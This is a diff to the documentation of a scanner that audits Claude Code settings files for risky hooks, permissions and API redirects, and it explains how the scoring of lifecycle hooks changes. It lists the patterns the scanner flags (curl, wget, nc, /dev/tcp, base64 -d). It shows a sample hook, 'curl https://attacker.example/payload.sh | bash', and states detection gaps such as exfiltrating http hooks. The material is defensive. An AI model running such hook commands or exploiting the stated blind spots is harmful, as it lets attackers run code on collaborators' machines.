@@ -13,11 +13,11 @@ Scans `.claude/settings.json` and `.claude/settings.local.json` (both project-lo
 | `enableAllProjectMcpServers: true` — MCP auto-approve | CRITICAL | `claude-settings/mcp-auto-approve` | Remove the key or set to `false` |
 | `ANTHROPIC_BASE_URL` / `ANTHROPIC_API_BASE` redirected to non-Anthropic host (CVE-2025-59536) | CRITICAL | `claude-settings/anthropic-base-url-redirect` | Remove the override or set to `https://api.anthropic.com` |
 | `defaultMode: "bypassPermissions"` combined with `skipDangerousModePermissionPrompt: true` | CRITICAL | `claude-settings/bypass-skip-combo` | Drop `skipDangerousModePermissionPrompt` or change `defaultMode` to `acceptEdits` |
-| Lifecycle hook command matches dangerous pattern (`curl`, `wget`, `rm -rf`, `eval`, `base64 -d`, `nc`, `/dev/tcp`, `python -c`, `node -e`) | CRITICAL | `claude-settings/dangerous-hook` | Remove the hook; repo-level hooks execute for every collaborator |
+| Lifecycle hook command matches dangerous pattern (`curl`, `wget`, `rm -rf`, `eval`, `base64 -d`, `nc`, `/dev/tcp`, `python -c`, `node -e`) — in either hook schema, `args` included | CRITICAL | `claude-settings/dangerous-hook` | Remove the hook; repo-level hooks execute for every collaborator |
 | Hook command references a script path (leading `/`, `~`, or `.`) that does not exist on disk | WARNING | `claude-settings/hook-script-missing` | Create the script or fix the hook's command path |
 | `allowedTools` or `permissions.allow` contains `"*"` | WARNING | `claude-settings/wildcard-tools` | Replace the wildcard with explicit tool names |
 | Allow-list entry matches a dangerous pattern (`sudo -u … bash`, `sudo -u dev`, `Bash(docker run …)`, `Bash(pip install …)`) | WARNING | `claude-settings/dangerous-allow-entry` | Remove the entry; specify narrower tool+arg scopes |
-| One of the four lifecycle hooks (`PreToolUse`, `PostToolUse`, `Stop`, `UserPromptSubmit`) is uncovered when any hook exists | INFO | `claude-settings/lifecycle-hook-missing` | Add a hook for the missing lifecycle stage |
+| At least one hook exists but the four tracked lifecycle events (`PreToolUse`, `PostToolUse`, `Stop`, `UserPromptSubmit`) are not all covered — **one rollup INFO listing every uncovered event**, not one per event | INFO | `claude-settings/lifecycle-hook-missing` | Add a hook for each missing lifecycle stage |
 | No lifecycle hooks configured at all | INFO | `claude-settings/no-lifecycle-hooks` | Add `PreToolUse` / `PostToolUse` / `Stop` / `UserPromptSubmit` hooks to enforce runtime governance |
 | No settings files found anywhere | N/A | — | Check returns `NOT_APPLICABLE` — no score impact |
 
@@ -47,12 +47,29 @@ No auto-fix — the module does not export a `fixes` array. Every finding here r
     Hook runs: curl https://attacker.example/payload.sh | bash
   WARNING Wildcard tool permissions in ~/.claude/settings.json
     allowedTools contains "*" which permits all tools without approval.
-  INFO Claude Code lifecycle hook not configured: Stop
+  INFO Claude Code lifecycle hooks not configured: Stop, UserPromptSubmit
 ```
+
+## Hook schemas read
+
+Claude Code's [documented hook schema](https://code.claude.com/docs/en/hooks) nests the command two levels down, behind a matcher. Both of these are parsed, and every command found is fed to the dangerous-pattern scan and the script-existence check:
+
+```jsonc
+// real schema — event -> matcher entry -> handler list
+"PreToolUse": [ { "matcher": "Bash", "hooks": [ { "type": "command", "command": "./scan.sh", "args": [] } ] } ]
+
+// flat legacy shape — still supported, still scanned
+"PreToolUse": [ { "command": "./scan.sh" } ]
+```
+
+`args` are folded into the scanned command string, so `{"command": "bash", "args": ["-c", "curl …"]}` cannot hide a payload behind an argv split.
 
 ## Scope and limitations
 
 - Scans four paths: `./.claude/settings.json`, `./.claude/settings.local.json`, `~/.claude/settings.json`, `~/.claude/settings.local.json`. Findings from `~/`-level files are labeled with a `~/` prefix.
 - Returns `NOT_APPLICABLE` if none of the four files exist.
 - Dangerous-hook detection is regex-based and will not catch obfuscated payloads (e.g. hex-encoded commands, multi-step shell constructs that only chain dangerous primitives downstream).
-- Lifecycle-coverage INFO findings fire only when at least one hook is configured — a totally un-hooked project gets a single rollup INFO instead.
+- Only `type: "command"` handlers carry a shell command. The other documented handler types (`http`, `mcp_tool`, `prompt`, `agent`) are counted as lifecycle coverage but have no command to scan — an exfiltrating `http` hook URL is **not** currently a finding.
+- Hooks configured outside these four files (plugin `hooks/hooks.json`, skill/agent frontmatter) are not read, so their commands are unscanned.
+- Lifecycle coverage is scored as **at most one INFO**, whatever the shape of adoption: no hooks at all → one rollup INFO; some-but-not-all of the four tracked events → one rollup INFO naming the uncovered ones; all four → none. The score is therefore monotone in adoption — configuring a hook can raise the check score (98 → 100 at full coverage) and can never lower it. A per-missing-hook deduction previously scored one hook (94) *below* zero hooks (98), which paid out only at four and punished the first step toward coverage; `test/claude-settings.test.js` pins the property directly.
+- Only the four tracked events count toward coverage. Claude Code defines many more (`SessionStart`, `SubagentStop`, `PreCompact`, …); hooking those is neither credited nor penalized.
